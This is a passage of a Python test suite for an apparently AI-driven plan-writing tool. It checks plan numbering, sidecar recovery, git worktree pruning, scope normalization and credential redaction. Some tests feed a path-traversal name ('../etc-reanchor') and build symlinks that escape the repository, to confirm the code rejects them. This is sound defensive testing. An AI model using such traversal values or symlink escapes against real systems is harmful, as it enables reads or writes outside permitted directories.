            "landing_path": "daydream_plans/001-batch-catalog-queries.md"},
        {"number": 2, "title": "Catalog observability", "status": expected_rows[1][1],
            "landing_path": "daydream_plans/002-catalog-observability.md"},
    ]
    section = _reanchored_report_section(plans_dir)
    assert "## Re-anchored plans" in section
    assert "Batch catalog queries" in section and "Catalog observability" in section
    assert "daydream_plans/001-batch-catalog-queries.md" in section
    assert "daydream_plans/002-catalog-observability.md" in section
    result = session.finish()
    assert len(result["written"]) == 2 and git_ops.worktree_lock_mtime(worktree) is None
    assert prune_stale_reanchor_worktrees(repo, private_workspace_owner=owner) == 1
    assert not worktree.exists() and ordinary.is_dir()
    assert str(worktree) not in git(repo, "worktree", "list", "--porcelain")
    assert {path.name: path.read_bytes() for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")} == main_bytes
    assert [(entry["number"], entry["status"]) for entry in _read_sidecar(plans_dir)["plans"]] == expected_rows
    later = PlanWriteSession(plans_dir, planned_at=new_head, private_workspace_owner=owner)
    replay = later.reserve([selection["finding"] for selection in selections])
    assert later.commit(replay[0], selections[0]).status == later.commit(replay[1], selections[1]).status == "skipped"
    finished = later.finish()
    assert finished["written"] == []
    assert [(entry["number"], entry["path"]) for entry in finished["skipped"]] == [
        (1, "001-batch-catalog-queries.md"), (2, "002-catalog-observability.md"),
    ]


@pytest.mark.parametrize("bad_name",
    [
        "../etc-reanchor",  # traversal: slash + leading dot
        ".hidden-reanchor",  # first char not [A-Za-z0-9]
        "a" * 81,           # over _SAFE_DIRNAME's 0-79 tail bound
        "run abc-reanchor",  # space outside the safe class
    ],
)
def test_prune_named_reanchor_worktree_rejects_unsafe_names(monkeypatch: pytest.MonkeyPatch, repo: Path, bad_name: str,
) -> None:
    root = _operational_root(repo)
    _forbid_default_private_base(monkeypatch, "unsafe name reached storage")
    before = set(root.iterdir())
    outcome = prune_named_reanchor_worktree(repo, bad_name)
    assert outcome.verdict == PRUNE_UNSAFE_NAME
    after = set(root.iterdir())
    assert before == after  # nothing reached the filesystem or git
    assert "run-abcd-reanchor" not in git(repo, "worktree", "list")


def test_prune_named_reanchor_worktree_rejects_non_reanchor_name(repo: Path,) -> None:
    root = _operational_root(repo)
    before = set(root.iterdir())
    outcome = prune_named_reanchor_worktree(repo, "run-abc")
    assert outcome.verdict == PRUNE_NOT_REANCHOR
    after = set(root.iterdir())
    assert before == after  # nothing reached the filesystem or git
    assert "run-abcd-reanchor" not in git(repo, "worktree", "list")


def test_prune_named_reanchor_worktree_not_found(repo: Path) -> None:
    outcome = prune_named_reanchor_worktree(repo, "run-zzzz-reanchor")
    assert outcome.verdict == PRUNE_NOT_FOUND


def test_prune_named_reanchor_worktree_unregistered_dir_is_git_failure(repo: Path,) -> None:
    target = _operational_root(repo) / "run-abcd-reanchor"
    target.mkdir(parents=True, exist_ok=True)  # plain dir, NOT a git worktree
    outcome = prune_named_reanchor_worktree(repo, "run-abcd-reanchor")
    assert outcome.verdict == PRUNE_GIT_FAILURE
    assert target.exists()  # left in place; git refused to remove a non-worktree
    # a plain dir is never a registered worktree, so this holds regardless of
    # how many real re-anchor worktrees the suite created
    assert "run-abcd-reanchor" not in git(repo, "worktree", "list")


@pytest.mark.parametrize("public_name", ["run-public-reanchor", "run-private-reanchor"],
                         ids=["distinct-old-name", "duplicate-old-name"])
def test_reanchor_operations_reject_public_namespace_without_mutation(
    repo: Path, owner: Any, public_name: str,
) -> None:
    operational = operational_worktree_root(owner)
    public = repo / ".daydream" / "worktrees" / public_name
    private = operational / "run-private-reanchor"
    git_ops.worktree_add(repo, public, "main", detach=True)
    git_ops.worktree_add(repo, private, "main", detach=True)
    (public / "operator.bin").write_bytes(b"public operator bytes\x00")
    before = git(repo, "worktree", "list", "--porcelain")
    for operation in (list_reanchor_worktrees, prune_stale_reanchor_worktrees):
        with pytest.raises(ArtifactVisibilityError, match="Unsupported public operational storage"):
            operation(repo, private_workspace_owner=owner)
    with pytest.raises(ArtifactVisibilityError, match="Unsupported public operational storage"):
        prune_named_reanchor_worktree(repo, private.name, private_workspace_owner=owner)
    assert git(repo, "worktree", "list", "--porcelain") == before
    assert private.is_dir() and public.is_dir()
    assert (public / "operator.bin").read_bytes() == b"public operator bytes\x00"


def test_list_reanchors_rejects_symlinked_operational_root_without_following(repo: Path, tmp_path: Path, owner: Any,
) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    retained = outside / "run-outside-reanchor"
    retained.mkdir()
    (retained / "operator.txt").write_bytes(b"outside bytes")
    (owner.operational_state_root / "operational").symlink_to(outside, target_is_directory=True,)
    with pytest.raises(ArtifactVisibilityError, match="operational re-anchor root"):
        list_reanchor_worktrees(repo, private_workspace_owner=owner)
    assert (retained / "operator.txt").read_bytes() == b"outside bytes"


@pytest.mark.parametrize("lock_state", ["live", "stale"])
def test_prune_reanchor_uses_exact_git_dir_with_duplicate_basename(
    repo: Path, tmp_path: Path, owner: Any, lock_state: str,
) -> None:

    operational = owner.operational_state_root / "operational"
    operational.mkdir(mode=0o700)
    name = "run-same-reanchor"
    other = tmp_path / "other-parent" / name
    target = operational / name
    lock_target = "active-run" if lock_state == "live" else "crashed-run"
    lock_other = None if lock_state == "live" else "different-live-run"
    git_ops.worktree_add(repo, other, "main", detach=True, lock_reason=lock_other)
    git_ops.worktree_add(repo, target, "main", detach=True, lock_reason=lock_target)
    assert git_ops.git_dir(other) != git_ops.git_dir(target)
    if lock_state == "stale":
        os.utime(git_ops.git_dir(target) / "locked", (0, 0))

    removed = prune_stale_reanchor_worktrees(repo, private_workspace_owner=owner)

    assert other.is_dir()
    if lock_state == "live":
        assert removed == 0
        assert target.is_dir()
    else:
        assert removed == 1
        assert not target.exists()


def _unsafe_legacy_reanchor_namespace(repo: Path, tmp_path: Path, *, namespace_shape: str,
) -> tuple[Path, Path, Path | None]:
    """Register an out-of-repo worktree, then point the legacy namespace at it."""
    outside = tmp_path / f"outside-{namespace_shape}"
    name = "run-outside-reanchor"
    external = (outside / "worktrees" / name if namespace_shape.startswith("ancestor") else outside / name)
    git_ops.worktree_add(repo, external, "main", detach=True)
    canary = external / "operator.bin"
    canary.write_bytes(b"outside operator bytes\x00")
    if namespace_shape.startswith("terminal"):
        (repo / ".daydream").mkdir()
        anchor = repo / ".daydream" / "worktrees"
    else:
        anchor = repo / ".daydream"
    if namespace_shape.endswith("symlink"):
        anchor.symlink_to(outside, target_is_directory=True)
        return external, canary, None
    anchor.write_bytes(b"operator namespace bytes\x00")
    return external, canary, anchor


@pytest.mark.parametrize("reanchor_op", ["list", "prune-stale"])
@pytest.mark.parametrize("namespace_shape", ["ancestor-symlink", "terminal-symlink", "ancestor-file", "terminal-file"],)
def test_reanchor_scans_reject_linked_legacy_namespace_before_mutation(
    repo: Path, tmp_path: Path, owner: Any, namespace_shape: str, reanchor_op: str,
) -> None:

    scan = list_reanchor_worktrees if reanchor_op == "list" else prune_stale_reanchor_worktrees
    external, canary, unsafe_file = _unsafe_legacy_reanchor_namespace(repo, tmp_path, namespace_shape=namespace_shape,)
    before = git(repo, "worktree", "list", "--porcelain")

    with pytest.raises(ArtifactVisibilityError, match="public operational storage"):
        scan(repo, private_workspace_owner=owner)

    assert external.is_dir()
    assert canary.read_bytes() == b"outside operator bytes\x00"
    if unsafe_file is not None:
        assert unsafe_file.read_bytes() == b"operator namespace bytes\x00"
    assert git(repo, "worktree", "list", "--porcelain") == before
    assert not (owner.operational_state_root / "operational" / external.name).exists()


def test_valid_linked_plan_is_preserved_for_every_executor_status(repo: Path, head_sha: str) -> None:
    plans_dir = repo / "daydream_plans"
    selections = [_plan_selection(repo, title) for title in (
        "Batch | catalog queries", "Catalog observability", "Catalog cache invalidation", "Catalog diagnostics",
    )]
    initial = _write_plans(plans_dir, selections, planned_at=head_sha)
    assert [entry["number"] for entry in initial["written"]] == [1, 2, 3, 4]
    index_path = plans_dir / "README.md"
    edited = index_path.read_text().replace("| TODO |", "| IN \\| PROGRESS |", 1)
    edited = edited.replace("| TODO |", "| DONE |", 1)
    edited = edited.replace("| TODO |", "| BLOCKED (tests failed after three executor attempts) |", 1)
    index_path.write_text(edited)
    (plans_dir / "002-catalog-observability.md").unlink()
    survivors = {path.name: path.read_bytes() for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")}
    sibling = _plan_selection(repo, "Catalog result ordering")
    replay = _write_plans(plans_dir, [*selections, sibling], planned_at=head_sha)
    assert [(entry["number"], entry["path"]) for entry in replay["written"]] == [
        (5, "005-catalog-result-ordering.md"),
    ]
    assert [(entry["finding"]["fingerprint"], entry["number"], entry.get("path")) for entry in replay["skipped"]] == [
        ("fp-batch-catalog-queries", 1, "001-batch-catalog-queries.md"),
        ("fp-catalog-observability", 2, None),
        ("fp-catalog-cache-invalidation", 3, "003-catalog-cache-invalidation.md"),
        ("fp-catalog-diagnostics", 4, "004-catalog-diagnostics.md"),
    ]
    expected = [
        (1, "fp-batch-catalog-queries", "Batch | catalog queries", "IN | PROGRESS"),
        (2, "fp-catalog-observability", "Catalog observability", "DONE"),
        (3, "fp-catalog-cache-invalidation", "Catalog cache invalidation",
            "BLOCKED (tests failed after three executor attempts)"),
        (4, "fp-catalog-diagnostics", "Catalog diagnostics", "TODO"),
        (5, "fp-catalog-result-ordering", "Catalog result ordering", "TODO"),
    ]
    assert [(entry["number"], entry["fingerprint"], entry["title"], entry["status"])
        for entry in _read_sidecar(plans_dir)["plans"]] == expected
    assert _planned_fingerprints(plans_dir) == {
        "fp-batch-catalog-queries", "fp-catalog-observability", "fp-catalog-cache-invalidation",
        "fp-catalog-diagnostics", "fp-catalog-result-ordering",
    }
    (plans_dir / PLAN_INDEX_FILENAME).unlink()
    recovered = _write_plans(plans_dir, [*selections, sibling], planned_at=head_sha)
    assert recovered["written"] == [] and len(recovered["skipped"]) == 5
    assert [(entry["number"], entry["fingerprint"], entry["title"], entry["status"])
        for entry in _read_sidecar(plans_dir)["plans"]] == expected
    assert {path.name: path.read_bytes()
        for path in plans_dir.glob("[0-9][0-9][0-9]-*.md") if path.name in survivors} == survivors
    assert sorted(path.name for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")) == [
        "001-batch-catalog-queries.md", "003-catalog-cache-invalidation.md", "004-catalog-diagnostics.md",
        "005-catalog-result-ordering.md",
    ]
    assert index_path.read_text().count("fingerprint:") == 5


def test_hand_edited_status_on_a_blocked_row_stops_the_retry(repo: Path, head_sha: str) -> None:
    plans_dir = repo / "daydream_plans"
    invalid = _authored_plan()
    invalid["test_plan"]["cases"] = []
    _write_plans(plans_dir, [_authoring_failure_selection(_issues(repo, invalid))], planned_at=head_sha,)
    assert _planned_fingerprints(plans_dir) == set()

    index_path = plans_dir / "README.md"
    blocked_status = "BLOCKED (PLAN_VALIDATION_FAILED: AUTHOR_SCHEMA_INVALID)"
    assert f"| {blocked_status} |" in index_path.read_text(encoding="utf-8")
    index_path.write_text(
        index_path.read_text(encoding="utf-8").replace(f"| {blocked_status} |", "| DONE |"), encoding="utf-8",
    )
    assert _planned_fingerprints(plans_dir) == {"fp-fix-n-plus-one"}

    result = _write_plans(plans_dir, [_selection(repo)], planned_at=head_sha)

    assert result["written"] == []
    assert len(result["skipped"]) == 1
    assert not list(plans_dir.glob("[0-9][0-9][0-9]-*.md"))
    sidecar = _read_sidecar(plans_dir)
    assert [(entry["number"], entry["status"], entry["host_blocked"])
        for entry in sidecar["plans"]
    ] == [(1, "DONE", False)]


@pytest.mark.parametrize("payload",
    [pytest.param("{ not json at all", id="unparseable"),
        pytest.param('{"schema_version": 99, "plans": []}', id="wrong-version"), pytest.param("[]", id="wrong-shape"),
        pytest.param('{"schema_version": 1, "plans": "nope"}', id="wrong-plans"),
    ],
)
def test_unusable_sidecar_never_reuses_a_number_already_on_disk(repo: Path, head_sha: str, payload: str,) -> None:
    plans_dir = repo / "daydream_plans"
    _write_plans(plans_dir, [_plan_selection(repo, "Batch catalog queries")], planned_at=head_sha,)
    (plans_dir / PLAN_INDEX_FILENAME).write_text(payload, encoding="utf-8")
    (plans_dir / "README.md").unlink()
    first_plan = (plans_dir / "001-batch-catalog-queries.md").read_text(encoding="utf-8")
    result = _write_plans(plans_dir, [_plan_selection(repo, "Catalog observability")], planned_at=head_sha,)
    assert [entry["number"] for entry in result["written"]] == [2]
    assert (plans_dir / "001-batch-catalog-queries.md").read_text(encoding="utf-8") == first_plan
    assert sorted(path.name for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")
    ) == ["001-batch-catalog-queries.md", "002-catalog-observability.md",]


def test_planner_title_credential_is_redacted_in_the_plan_index(repo: Path, head_sha: str) -> None:
    plans_dir = repo / "daydream_plans"
    plan = _authored_plan()
    plan["title"] = "Rotate AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE in deploys"
    _write_plans(plans_dir, [_selection(repo, plan=plan)], planned_at=head_sha)
    sidecar_text = (plans_dir / PLAN_INDEX_FILENAME).read_text(encoding="utf-8")
    sidecar = json.loads(sidecar_text)
    assert "AKIAIOSFODNN7EXAMPLE" not in sidecar_text
    assert sidecar["plans"][0]["title"] == ("Rotate AWS_SECRET_ACCESS_KEY=[REDACTED_ENV_VAR] in deploys")
    for path in plans_dir.rglob("*"):
        if path.is_file():
            assert "AKIAIOSFODNN7EXAMPLE" not in path.read_text(encoding="utf-8")


@pytest.mark.parametrize("failure_kind", ["transport", "validation"])
def test_host_blocked_attempt_reuses_reserved_number_when_retry_succeeds(repo: Path, head_sha: str, failure_kind: str,
) -> None:
    plans_dir = repo / "daydream_plans"
    if failure_kind == "transport":
        failed_selection = {"finding": _finding(),
            "_attempt": {"transport_error_code": "NO_STRUCTURED_OBJECT", "received_result": None,}, "error": True,
        }
    else:
        invalid = _authored_plan()
        invalid["test_plan"]["cases"] = []
        failed_selection = _authoring_failure_selection(_issues(repo, invalid))
    failed = _write_plans(plans_dir, [failed_selection], planned_at=head_sha)
    failed_index = (plans_dir / "README.md").read_text()
    expected_failure_status = ("PLAN_WRITER_FAILED" if failure_kind == "transport" else "PLAN_VALIDATION_FAILED")
    assert expected_failure_status in failed_index
    assert failed_index.count("fingerprint:fp-fix-n-plus-one") == 1
    assert _planned_fingerprints(plans_dir) == set()
    assert not list(plans_dir.glob("[0-9][0-9][0-9]-*.md"))

    retried = _write_single_plan(repo, _assembled(repo), head_sha)
    unrelated = _write_plans(plans_dir,
        [{"finding": _finding(fingerprint="fp-observability"),
                **_assembled(repo, _authored_plan(title="Catalog observability")),
            }
        ], planned_at=head_sha,
    )

    assert failed["written"] == []
    assert [entry["number"] for entry in retried["written"]] == [1]
    assert [entry["number"] for entry in unrelated["written"]] == [2]
    assert sorted(path.name for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")
    ) == ["001-batch-catalog-queries.md", "002-catalog-observability.md",]
    index = (plans_dir / "README.md").read_text()
    assert index.count("fingerprint:fp-fix-n-plus-one") == 1
    assert "PLAN_WRITER_FAILED" not in index
    assert "PLAN_VALIDATION_FAILED" not in index


def test_rejected_index_status_is_preserved_and_not_retried(repo: Path, head_sha: str) -> None:
    plans_dir = repo / "daydream_plans"
    plans_dir.mkdir()
    index_path = plans_dir / "README.md"
    rejected_row = ("| 001 <!-- fingerprint:fp-fix-n-plus-one --> | "
        "Fix N+1 catalog queries | P2 | M | "
        "REJECTED (superseded by repository evidence) |"
    )
    index_path.write_text(
        "# Implementation Plans\n\n"
        "## Execution order & status\n\n"
        "| Plan | Title | Priority | Effort | Status |\n"
        "|------|-------|----------|--------|--------|\n"
        f"{rejected_row}\n",
        encoding="utf-8",
    )

    result = _write_plans(plans_dir, [_selection(repo)], planned_at=head_sha)

    assert result["written"] == []
    assert len(result["skipped"]) == 1
    assert index_path.read_text().count(rejected_row) == 1
    assert not list(plans_dir.glob("[0-9][0-9][0-9]-*.md"))


def test_attempt_diagnostics_distinguish_failure_stages_and_success(repo: Path, head_sha: str,) -> None:
    authoring_invalid = _authored_plan()
    authoring_invalid["title"] = "Too short"

    selections = [{"finding": _finding(fingerprint="fp-transport"),
            "_attempt": {"descriptor": "plan-transport", "backend": "FakeBackend", "model": "fake-model",
                "received_result": None, "transport_error_code": "NO_STRUCTURED_OBJECT",
            }, "error": True,
        }, _authoring_failure_selection(_issues(repo, authoring_invalid), fingerprint="fp-authoring",),
        {"finding": _finding(fingerprint="fp-success"),
            **_assembled(repo, _authored_plan(title="Land the successful plan")),
        },
    ]

    result = _write_plans(repo / "daydream_plans", selections, planned_at=head_sha,)
    diagnostics = {attempt["finding"]["fingerprint"]: attempt for attempt in result["diagnostics"]}
    assert {fingerprint: (attempt["stage"], attempt["disposition"])
        for fingerprint, attempt in diagnostics.items()
    } == {"fp-transport": ("transport", "blocked"), "fp-authoring": ("authoring", "blocked"),
        "fp-success": ("success", "success"),
    }
    assert diagnostics["fp-transport"]["errors"] == [{"code": "NO_STRUCTURED_OBJECT", "pointer": "/"}]
    assert diagnostics["fp-authoring"]["errors"] == [
        {"code": "AUTHOR_SCHEMA_INVALID", "pointer": "/title", "detail": "minLength=12;actual=9",}
    ]
    assert diagnostics["fp-success"]["artifact"]["path"].endswith("-successful-plan.md")
    index = (repo / "daydream_plans/README.md").read_text()
    assert "BLOCKED (PLAN_VALIDATION_FAILED: AUTHOR_SCHEMA_INVALID)" in index


def test_load_rejections_returns_empty_for_absent_or_malformed_file(tmp_path: Path,) -> None:
    plans_dir = tmp_path / "daydream_plans"
    assert load_rejections(plans_dir) == {}
    plans_dir.mkdir()
    (plans_dir / "rejected.json").write_text("{not json")
    assert load_rejections(plans_dir) == {}



def test_assemble_reports_every_issue_at_once_with_pointers_and_hints(repo: Path) -> None:
    plan = _authored_plan()
    plan["title"] = "Too short"
    plan["steps"][0]["verification"]["recon_command_id"] = "make-tests"
    plan["steps"][0]["changes"][0]["operation"] = "create"
    (repo / "tests/occupied").mkdir()
    plan["scope"]["new_paths"] = [{"path": "tests/occupied", "role": "A directory cannot become a new file."}]
    _add_readme_change(plan)
    case = plan["test_plan"]["cases"][0]
    plan["test_plan"]["cases"].extend([
        {**case, "name": "Catalog loading preserves item order"}, {**case, "name": "Catalog loading accepts no items"},
    ])
    issues = _issues(repo, plan)
    by_location = {(issue.code, issue.pointer): issue for issue in issues}
    assert len(issues) == len(by_location) == 7
    assert set(by_location) == {
        ("AUTHOR_SCHEMA_INVALID", "/title"), ("AUTHOR_SCHEMA_INVALID", "/scope/out_of_scope_paths"),
        ("CREATE_PATH_NOT_NEW", "/steps/0/changes/0/path"),
        ("RECON_COMMAND_UNKNOWN", "/steps/0/verification/recon_command_id"),
        ("NEW_PATH_ALREADY_EXISTS", "/scope/new_paths/0/path"),
        ("DUPLICATE_TEST_SYMBOL", "/test_plan/cases/1/test_symbol"),
        ("DUPLICATE_TEST_SYMBOL", "/test_plan/cases/2/test_symbol"),
    }
    assert by_location["AUTHOR_SCHEMA_INVALID", "/title"].detail == "minLength=12;actual=9"
    assert by_location["AUTHOR_SCHEMA_INVALID", "/scope/out_of_scope_paths"].detail == "minItems=1;actual=0"
    unknown = by_location["RECON_COMMAND_UNKNOWN", "/steps/0/verification/recon_command_id"]
    assert unknown.hint == "valid recon command ids: test-suite, git-diff"
    assert all("parameterized test" in (issue.hint or "")
        for (code, _), issue in by_location.items() if code == "DUPLICATE_TEST_SYMBOL")



def test_plan_normalization_reconciles_one_heterogeneous_scope_before_rendering(repo: Path, head_sha: str) -> None:
    plan = _authored_new_file_plan()
    collision, fresh, deleted = "tests/test_catalog_batching.py", "tests/test_fresh.py", "apps/catalog/legacy_loader.py"
    (repo / collision).write_text("def test_placeholder():\n    assert True\n", encoding="utf-8")
    (repo / "README.md").write_text('api_key = "b4dc0ffeeplaintext"\n# Catalog service\n', encoding="utf-8")
    plan["scope"]["existing_paths"].extend([
        dict(plan["scope"]["existing_paths"][0]), {"path": fresh, "role": "An absent path must stay new."},
    ])
    plan["scope"]["new_paths"].extend([
        dict(plan["scope"]["new_paths"][0]),
        {"path": "apps/catalog/api.py", "role": "An existing implementation cannot remain new."},
        {"path": fresh, "role": "Add a separate catalog regression."},
    ])
    plan["scope"]["out_of_scope_paths"].append(
        {"path": "apps/catalog/api.py", "reason": "An in-scope path cannot remain excluded."}
    )
    _declare_makefile_out_of_scope(plan)
    _add_readme_change(plan)
    plan["context_excerpts"][0]["end_line"] = 200
    plan["context_excerpts"].append({"path": collision, "start_line": 2, "end_line": 2,
        "file_role": "Preserve the authored assertion anchor while relocating scope."})
    plan["false_assumption"].update(related_paths=[deleted], related_step_numbers=[1, 7])

    assembled = _assembled(repo, plan)
    scope = assembled["scope"]
    assert [entry["path"] for entry in scope["existing_paths"]] == [
        "apps/catalog/api.py", "tests/test_catalog.py", "tests/test_catalog_batching.py", "README.md",
    ]
    assert [entry["path"] for entry in scope["new_paths"]] == ["tests/test_fresh.py"]
    assert [entry["path"] for entry in scope["out_of_scope_paths"]] == ["Makefile", "apps/catalog/legacy_loader.py"]
    assert [change["operation"] for step in assembled["steps"] for change in step["changes"]] == [
        "modify", "modify", "modify",
    ]
    excerpts = {excerpt["path"]: excerpt for excerpt in assembled["current_state_excerpts"]}
    assert excerpts[collision] == {
        "path": collision, "line_anchor": {"start_line": 2, "end_line": 2},
        "file_role": "Preserve the authored assertion anchor while relocating scope.",
        "verbatim_excerpt": "    assert True",
    }
    assert excerpts["README.md"] == {
        "path": "README.md", "line_anchor": {"start_line": 1, "end_line": 2},
        "file_role": ("Named by a plan step but left out of the authored scope lists; the host "
            "declared it in scope so the executor is allowed to change it."),
        "verbatim_excerpt": "api_key = <redacted>\n# Catalog service",
    }
    assert excerpts["apps/catalog/api.py"] == {
        "path": "apps/catalog/api.py", "line_anchor": {"start_line": 1, "end_line": 2},
        "file_role": "Implement batched catalog loading.",
        "verbatim_excerpt": "def list_catalog():\n    return [load_item(item_id) for item_id in item_ids]",
    }
    assert "b4dc0ffeeplaintext" not in json.dumps(assembled)
    drift = assembled["stop_conditions"][0]
    assert set(drift["related_paths"]) == set(excerpts) == {
        "apps/catalog/api.py", "tests/test_catalog.py", "tests/test_catalog_batching.py", "README.md",
    }
    assert assembled["stop_conditions"][3]["related_paths"] == [deleted]
    assert assembled["stop_conditions"][3]["related_step_ids"] == ["step-1"]
    rendered = _render_assembled_plan(assembled, head_sha)
    assert ("git add apps/catalog/api.py tests/test_catalog.py tests/test_catalog_batching.py README.md "
        "tests/test_fresh.py" in rendered)
    assert f"- `{collision}` (existing) —" in rendered and f"- `{collision}` (create) —" not in rendered
    assert "- `tests/test_fresh.py` (create) —" in rendered
    assert (f"- `{deleted}` — Referenced by a stop condition for context only; "
        "do not create, modify, or depend on this path." in rendered)
    assert "step-7" not in rendered and not (repo / deleted).exists() and not (repo / fresh).exists()


def _scoped_recon_command(command_id: str, *, command: str, paths: list[str],) -> dict[str, Any]:
    scoped = deepcopy(_recon_commands()[0])
    scoped["id"] = command_id
    scoped["command"] = command
    scoped["purpose"] = f"Run the {command_id} checks"
    scoped["applicability"]["scope"] = {"kind": "in-scope-paths", "paths": paths,}
    return scoped


def _retarget_refs(plan: dict[str, Any], recon_command_id: str) -> None:
    plan["steps"][0]["verification"] = _ref(recon_command_id)
    plan["test_plan"]["cases"][0]["verification"] = _ref(recon_command_id)
    plan["done_criteria"][0]["verification"] = _ref(recon_command_id)


def test_command_scope_mismatch_without_a_repo_wide_command_renders_a_caveat(repo: Path, head_sha: str,) -> None:
    plan = _authored_plan()
    # billing is not a path this plan changes, so the command's scope fits
    # nothing in the plan and no repository-wide command exists to fall back to.
    _retarget_refs(plan, "billing-only")
    commands = [_scoped_recon_command("billing-only", command="uv run pytest apps/billing", paths=["apps/billing"],)]
    assembled = _assembled(repo, plan, commands=commands)
    rendered = _render_assembled_plan(assembled, head_sha)
    assert "**Command**: `uv run pytest apps/billing`" in rendered
    assert ("**Why this gate**: Scope caveat from the host: this command's "
        "verified applicability does not cover every target of this "
        "verification, and no verified command that covers them is available "
        "here. Run it as written and report what it reports; do not substitute "
        "a command of your own." in rendered
    )


def test_scope_mismatched_ref_with_appended_args_keeps_its_command(repo: Path, head_sha: str,) -> None:
    """A suffix authored for one command is never pasted onto another."""
    plan = _authored_plan()
    _retarget_refs(plan, "catalog-only")
    plan["steps"][0]["verification"] = _ref(
        "catalog-only", appended_args="-k batches", note="Runs the focused catalog regression.",
    )
    commands = [*_recon_commands(),
        _scoped_recon_command("catalog-only", command="uv run pytest apps/catalog", paths=["apps/catalog"],),
    ]

    assembled = _assembled(repo, plan, commands=commands)
    rendered = _render_assembled_plan(assembled, head_sha)
    assert "**Command**: `uv run pytest apps/catalog -k batches`" in rendered
    assert ("**Why this gate**: Runs the focused catalog regression. Scope caveat "
        "from the host: this command's verified applicability does not cover "
        "every target of this verification, and no verified command that "
        "covers them is available here. Run it as written and report what it "
        "reports; do not substitute a command of your own." in rendered
    )


def _use_existing_catalog_coverage(plan: dict[str, Any]) -> None:
    plan["scope"]["existing_paths"] = [plan["scope"]["existing_paths"][0]]
    plan["context_excerpts"] = [plan["context_excerpts"][0]]
    plan["steps"][0]["changes"] = [plan["steps"][0]["changes"][0]]
    plan["test_plan"] = {"mode": "existing-coverage",
        "rationale": ("The existing catalog regression already observes the preserved result."),
        "existing_coverage": [{"path": "tests/test_catalog.py", "symbol": "test_list_catalog_returns_items",
                "behavior": ("The public catalog query still returns the expected item list."),
                "verification": _ref(appended_args="tests/test_catalog.py -q"),
            }
        ], "exemplars": [], "cases": [],
    }


def test_existing_coverage_command_is_scoped_to_read_only_test_evidence(repo: Path, head_sha: str,) -> None:
    plan = _authored_plan()
    _use_existing_catalog_coverage(plan)
    plan["test_plan"]["existing_coverage"][0]["verification"] = _ref("catalog-test-only")
    commands = [*_recon_commands(),
        _scoped_recon_command(
            "catalog-test-only", command="uv run pytest tests/test_catalog.py", paths=["tests/test_catalog.py"],
        ),
    ]

    assembled = _assembled(repo, plan, commands=commands)

    assert [entry["path"] for entry in assembled["scope"]["existing_paths"]] == ["apps/catalog/api.py"]
    coverage = assembled["test_plan"]["existing_coverage"][0]
    assert coverage["verification"]["command"] == ("uv run pytest tests/test_catalog.py")
    rendered = _render_assembled_plan(assembled, head_sha)
    assert "`uv run pytest tests/test_catalog.py`" in rendered
    assert "Retargeted by the host" not in rendered.partition("### Existing coverage")[2]
    criterion = assembled["done_criteria"][-2]
    assert criterion["description"] == "The cited existing coverage passes: test_list_catalog_returns_items."
    assert "**Mode**: `existing-coverage`" in rendered and "### Existing coverage" in rendered
    assert "`tests/test_catalog.py::test_list_catalog_returns_items`" in rendered
    assert "### Named cases" not in rendered



def test_existing_coverage_population_requires_exact_test_declarations(repo: Path) -> None:
    (repo / "tests/test_mentions.py").write_text(
        "def test_longer_extra():\n    assert True\n"
        "# def test_comment():\n"
        'DESCRIPTION = "def test_string():"\n'
        "def catalog_helper():\n    return []\n", encoding="utf-8",
    )
    plan = _authored_plan()
    _use_existing_catalog_coverage(plan)
    coverage = plan["test_plan"]["existing_coverage"]
    coverage.extend([
        {**coverage[0], "path": "tests/test_mentions.py", "symbol": "test_longer"},
        {**coverage[0], "path": "tests/test_mentions.py", "symbol": "test_comment"},
        {**coverage[0], "path": "tests/test_mentions.py", "symbol": "test_string"},
        {**coverage[0], "path": "tests/test_mentions.py", "symbol": "catalog_helper"},
        {**coverage[0], "path": "apps/catalog/api.py", "symbol": "list_catalog"},
    ])
    assert [render_issue(issue) for issue in _issues(repo, plan)] == [
        "EXISTING_COVERAGE_INVALID@/test_plan/existing_coverage/1",
        "EXISTING_COVERAGE_INVALID@/test_plan/existing_coverage/2",
        "EXISTING_COVERAGE_INVALID@/test_plan/existing_coverage/3",
        "EXISTING_COVERAGE_INVALID@/test_plan/existing_coverage/4",
        "EXISTING_COVERAGE_INVALID@/test_plan/existing_coverage/5",
    ]


def test_deletion_only_plan_can_omit_test_code_when_non_behavioral(repo: Path, head_sha: str,) -> None:
    plan = _authored_plan(title="Delete obsolete catalog documentation")
    plan["scope"]["existing_paths"] = [{"path": "README.md", "role": "Delete obsolete catalog documentation.",}]
    plan["scope"]["new_paths"] = []
    plan["scope"]["out_of_scope_paths"] = [
        {"path": "apps/catalog", "reason": "Deleting obsolete documentation does not change runtime code.",}
    ]
    plan["context_excerpts"] = [
        {"path": "README.md", "start_line": 1, "end_line": 1, "file_role": "Delete obsolete catalog documentation.",}
    ]
    plan["steps"] = [{"title": "Delete the obsolete catalog documentation",
            "changes": [_change('README.md', 'README.md', 'delete',
                    'Delete README.md because its obsolete catalog notes are superseded by the '
                    'maintained documentation site.',
                    'The repository no longer contains the README.md path.'
                )
            ], "verification": None,
        }
    ]
    plan["test_plan"] = {
        "mode": "not-applicable", "rationale": ("This removes documentation and does not alter supported behavior."),
        "existing_coverage": [], "exemplars": [], "cases": [],
    }
    plan["done_criteria"] = [_criterion("static-invariant", "The repository no longer contains the README.md path."),]
    plan["false_assumption"]["related_paths"] = ["README.md"]

    assembled = _assembled(repo, plan)

    assert all(criterion["kind"] != "test-gate" for criterion in assembled["done_criteria"])
    rendered = _render_assembled_plan(assembled, head_sha)
    assert "**Mode**: `not-applicable`" in rendered
    assert "No test-code change is required" in rendered
    assert "(delete):" in rendered
    assert "**Deletion check**: confirm `README.md` no longer exists" in rendered
    assert "(static-invariant)**: The repository no longer contains the README.md path." in rendered
    assert "### Named cases" not in rendered


def test_not_applicable_rejects_behavior_bearing_production_deletion(repo: Path,) -> None:
    plan = _authored_plan(title="Delete obsolete catalog implementation")
    plan["scope"]["existing_paths"] = [plan["scope"]["existing_paths"][0]]
    plan["context_excerpts"] = [plan["context_excerpts"][0]]
    plan["steps"][0]["changes"] = [_change('apps/catalog/api.py', 'apps/catalog/api.py', 'delete',
            'Delete apps/catalog/api.py because the implementation is believed to be unused by supported callers.',
